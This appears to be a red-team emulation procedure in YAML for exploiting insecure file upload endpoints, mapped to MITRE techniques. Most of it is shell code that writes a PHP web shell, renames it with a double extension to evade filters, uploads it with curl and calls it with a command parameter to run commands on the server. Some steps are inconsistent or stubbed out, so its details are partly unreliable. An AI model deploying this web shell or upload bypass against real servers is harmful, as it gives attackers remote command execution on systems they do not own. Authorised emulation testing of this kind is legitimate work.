name: "016: File upload vulnerability"
description: "Exploit insecure file upload functionality to upload and execute malicious files"
id: "i9j2f4k7-3h6g-9f1k-4i7j-0g8h3f6k1j2i"
api_version: "2.0"
platform: darwin
tags:
  - initial_access
  - web_exploitation
  - file_upload
  - arbitrary_file_upload
actors: []
mitre_attack:
  tactics:
    - initial_access
  techniques:
    - T1190
    - T1505
procedure_examples: []
arguments:
  target_url:
    description: "Upload endpoint URL"
    type: string
    required: true
    default: "http://vulnerable-app.local/upload.php"
  upload_directory:
    description: "Directory where uploaded files are stored"
    type: string
    required: true
    default: "/uploads"
  malicious_file:
    description: "Path to malicious file to upload"
    type: string
    required: true
    default: "/tmp/malicious.php"
  bypass_technique:
    description: "Technique to bypass file upload restrictions (mime, extension, magic)"
    type: string
    required: true
    default: "extension"
steps:
  - name: "Create malicious file"
    description: "Generate a malicious file for upload"
    command: |
      echo "[*] Creating malicious file"
      cat > "${malicious_file}" << 'MALWARE'
      <?php
      system($_GET['cmd']);
      ?>
      MALWARE
      echo "[+] Malicious file created: ${malicious_file}"
  - name: "Bypass upload restrictions"
    description: "Apply bypass technique to evade file upload filters"
    command: |
      echo "[*] Applying ${bypass_technique} bypass technique"
      case "${bypass_technique}" in
        extension)
          cp "${malicious_file}" "${malicious_file}.jpg"
          echo "[+] Added double extension"
          ;;
        mime)
          echo "[*] Would modify MIME type headers"
          ;;
        magic)
          echo "[*] Would prepend magic bytes to file"
          ;;
        null)
          echo "[*] Would use null byte in filename"
          ;;
      esac
  - name: "Upload file to target"
    description: "Upload the malicious file to the target server"
    command: |
      echo "[*] Uploading malicious file to ${target_url}"
      if [ -f "${malicious_file}.jpg" ]; then
        file_to_upload="${malicious_file}.jpg"
      else
        file_to_upload="${malicious_file}"
      fi
      curl -s -F "file=@${file_to_upload}" "${target_url}" -o /tmp/upload_result.txt
      cat /tmp/upload_result.txt | head -20
  - name: "Execute uploaded file"
    description: "Execute the uploaded file on the target"
    command: |
      echo "[*] Attempting to execute uploaded file"
      base_url="${target_url%/*}"
      filename=$(basename "${malicious_file}")
      curl -s "${base_url}${upload_directory}/${filename}?cmd=id" > /tmp/execution_result.txt
      cat /tmp/execution_result.txt
checks:
  - name: "Upload success check"
    description: "Verify file was successfully uploaded"
    command: "grep -qi 'success\\|uploaded\\|complete' /tmp/upload_result.txt && echo 'PASS' || echo 'FAIL'"
  - name: "Execution verification"
    description: "Verify uploaded file is executable"
    command: "grep -q 'root\\|uid\\|www' /tmp/execution_result.txt 2>/dev/null && echo 'PASS' || echo 'FAIL'"
tests:
  - name: "file_upload_test"
    description: "Test file upload vulnerability in dry run mode"
    dry_run: true
    command: |
      echo "[TEST] File Upload Vulnerability Test (Dry Run)"
      echo "[TEST] Target: ${target_url}"
      echo "[TEST] Bypass: ${bypass_technique}"
      echo "[TEST] File: $(basename ${malicious_file})"
      echo "[TEST] Would create, bypass filters, and upload file"
cleanup:
  - name: "Remove upload artifacts"
    description: "Delete malicious files and uploaded artifacts"
    command: |
      echo "[*] Cleaning up file upload artifacts"
      rm -f "${malicious_file}" 2>/dev/null
      rm -f "${malicious_file}.jpg" 2>/dev/null
      rm -f /tmp/upload_result.txt 2>/dev/null
      rm -f /tmp/execution_result.txt 2>/dev/null
      echo "[+] File upload cleanup complete"
